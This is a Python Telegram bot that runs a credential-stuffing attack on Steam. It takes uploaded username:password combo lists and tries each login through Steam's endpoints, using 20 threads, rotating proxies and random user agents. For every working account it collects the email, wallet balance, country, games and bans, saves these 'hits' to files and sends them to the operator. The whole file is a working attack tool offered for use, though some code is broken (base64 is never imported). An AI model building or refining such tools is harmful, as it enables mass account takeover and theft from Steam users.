#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚀 STEAM CHECKER TELEGRAM BOT - FAST & IMPROVED v2
- 20 threads (faster)
- Smart progress (no spam)
- Proxy support
- /status command
- Cleaner messages
"""

import os
import time
import asyncio
import logging
import re
import random
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ========================= CONFIG =========================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()

try:
    OWNER_ID = int(OWNER_ID_STR)
except ValueError:
    raise ValueError(f"❌ OWNER_ID must be numeric only! Got: {OWNER_ID_STR}")

if not TELEGRAM_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN not set!")

MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

lock = asyncio.Lock()
stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
progress_message_id = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# ====================== HELPERS ======================
def create_results_folder():
    Path("Results").mkdir(parents=True, exist_ok=True)

def save_hit(filename, data):
    filepath = os.path.join("Results", filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Created by {MY_SIGNATURE}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

def shorten_games(games, limit=10):
    if not games:
        return "None"
    if len(games) > limit:
        return " | ".join(str(g) for g in games[:limit]) + f" ... (+{len(games)-limit})"
    return " | ".join(str(g) for g in games)

# ====================== STEAM CHECKER (Faster) ======================
def check_steam_account(combo: str, proxy=None):
    try:
        username, password = [x.strip() for x in combo.split(':', 1)]
    except:
        return None

    session = requests.Session()
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Origin": "https://steamcommunity.com",
        "Referer": "https://steamcommunity.com/login/",
    }
    session.headers.update(headers)

    try:
        # RSA Key
        r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                         data={"donotcache": int(time.time()*1000), "username": username}, timeout=10)
        j1 = r1.json()
        if not j1.get("success"):
            return None

        # Encrypt
        rsa = RSA.construct((int(j1["publickey_mod"], 16), int(j1["publickey_exp"], 16)))
        cipher = PKCS1_v1_5.new(rsa)
        encrypted = base64.b64encode(cipher.encrypt(password.encode())).decode()

        # Login
        payload = {
            "donotcache": int(time.time()*1000),
            "password": encrypted,
            "username": username,
            "twofactorcode": "",
            "rsatimestamp": j1["timestamp"],
            "remember_login": "false",
        }

        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=12)
        if not r2.json().get("success"):
            return None

        # Fetch details with shorter delays
        time.sleep(0.4)
        r_acc = session.get("https://store.steampowered.com/account/", timeout=12)
        email, balance, country = parse_account_page(r_acc.text)

        time.sleep(0.4)
        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=12)
        total_games, level, limited = parse_profile_page(r_profile.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.4)
            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=12)
            games = parse_games_page(r_games.text)

        vac = game_b = comm = "Unknown"
        if "/profiles/" in r_profile.url:
            sid = r_profile.url.split("/profiles/")[1].split("/")[0]
            time.sleep(0.4)
            r_ban = session.get(f"https://steamcommunity.com/profiles/{sid}", timeout=12)
            vac, game_b, comm = parse_ban_page(r_ban.text)

        return {
            "username": username, "password": password,
            "email": email or "Unknown", "balance": balance or "Unknown",
            "country": country or "Unknown", "total_games": total_games or "0",
            "games": games, "level": level or "0", "limited": limited,
            "vac_bans": vac, "game_bans": game_b, "community_ban": comm,
        }
    except Exception as e:
        logger.debug(f"Error on {username}: {e}")
        return None

# Parsers (same as before - unchanged for brevity)
def parse_account_page(html): 
    # ... (copy from previous version)
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if inp := soup.find("input", id="account_name"):
            email = inp.get("value", "Unknown")
        if bal := soup.find("a", id="header_wallet_balance"):
            balance = bal.get_text(strip=True)
        if sel := soup.find("select", id="account_country"):
            if opt := sel.find("option", selected=True):
                country = opt.get_text(strip=True)
    except: pass
    return email, balance, country

def parse_profile_page(html):
    total = level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if a := soup.find("a", href=re.compile(r"/games/")):
            if s := a.find(string=re.compile(r"\d+")):
                total = re.search(r'(\d+)', s).group(1) if re.search(r'(\d+)', s) else "0"
        if lvl := soup.find("span", class_=re.compile("Level")):
            level = lvl.get_text(strip=True)
        if "limited" in html.lower():
            limited = "Yes"
    except: pass
    return total, level, limited

def parse_games_page(html):
    games = []
    try:
        for div in BeautifulSoup(html, "html.parser").find_all("div", class_="gameListRowItemName")[:15]:
            if t := div.get_text(strip=True):
                games.append(t)
    except: pass
    return games

def parse_ban_page(html):
    vac = game = "0"
    comm = "No"
    try:
        if m := re.search(r'(\d+)\s*VAC', html, re.I): vac = m.group(1)
        if m := re.search(r'(\d+)\s*game ban', html, re.I): game = m.group(1)
        if "community ban" in html.lower(): comm = "Yes"
    except: pass
    return vac, game, comm

# ====================== BOT ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready!</b>\n\n"
        "Send <b>.txt</b> combo file (username:password)\n"
        "Optional: Send <b>proxies.txt</b> (one proxy per line)\n"
        "Commands: /status", parse_mode=ParseMode.HTML)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    if stats['total'] == 0:
        await update.message.reply_text("No scan running.")
        return
    elapsed = time.time() - stats['start_time']
    await update.message.reply_text(
        f"📊 <b>Current Status</b>\n"
        f"Checked: {stats['checked']}/{stats['total']}\n"
        f"Valid: {stats['valid']}\n"
        f"Time: {int(elapsed//60)}m {int(elapsed%60)}s", 
        parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'): 
        await update.message.reply_text("Only .txt files allowed.")
        return

    await update.message.reply_text(f"📥 Received: {doc.file_name}")
    file = await doc.get_file()
    path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(path)

    if "proxy" in doc.file_name.lower():
        with open(path) as f:
            proxies = [line.strip() for line in f if line.strip()]
        context.user_data['proxies'] = proxies
        await update.message.reply_text(f"✅ Loaded {len(proxies)} proxies.")
        return

    # Combo file
    with open(path, encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting with 20 threads...")

    global stats
    stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    proxies = context.user_data.get('proxies', [])

    asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))

async def run_checker(combos, proxies, chat_id, bot):
    create_results_folder()

    async def progress_updater():
        last_update = 0
        while stats['checked'] < stats['total']:
            await asyncio.sleep(5)
            if stats['checked'] - last_update >= 15 or stats['checked'] == stats['total']:
                last_update = stats['checked']
                try:
                    await bot.send_message(chat_id, 
                        f"🔄 Progress: {stats['checked']}/{stats['total']} | Valid: {stats['valid']}")
                except: pass

    asyncio.create_task(progress_updater())

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for combo in combos:
            proxy = random.choice(proxies) if proxies else None
            futures.append(executor.submit(process_account, combo, proxy, chat_id, bot))
        for f in futures:
            try: f.result()
            except: pass

    # Final summary + files
    summary = f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {int((time.time()-stats['start_time'])//60)}m {int((time.time()-stats['start_time'])%60)}s
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

💎 {MY_SIGNATURE}"""

    await bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)

    for fname in ["All_Hits.txt", "Valid_With_Email.txt", "Valid_Without_Email.txt"]:
        p = os.path.join("Results", fname)
        if os.path.exists(p) and os.path.getsize(p) > 100:
            await bot.send_document(chat_id, open(p, 'rb'), caption=fname)

def process_account(combo, proxy, chat_id, bot):
    result = check_steam_account(combo, proxy)
    if result:
        hit = f"{result['username']}:{result['password']}"
        save_hit("All_Hits.txt", hit)
        if result['email'] != "Unknown":
            save_hit("Valid_With_Email.txt", f"{hit}\n{result['email']}:{result['password']}")
        else:
            save_hit("Valid_Without_Email.txt", hit)

        msg = f"""✅ <b>STEAM HIT</b>

🔑 <code>{result['username']}:{result['password']}</code>
💰 Balance: {result['balance']}
🌍 Country: {result['country']}
🎮 Games: {result['total_games']} ({shorten_games(result['games'])})
📊 Level: {result['level']} | Limited: {result['limited']}
🚫 Bans: VAC {result['vac_bans']} | Game {result['game_bans']} | Comm {result['community_ban']}
📧 Email: {result['email']}

💎 {MY_SIGNATURE}"""

        try:
            asyncio.run(bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML))
        except: pass

        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1
    with lock:
        stats['checked'] += 1

# Main
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))

    print("🚀 Steam Checker Bot Started - 20 threads")
    app.run_polling()

if __name__ == "__main__":
    main()
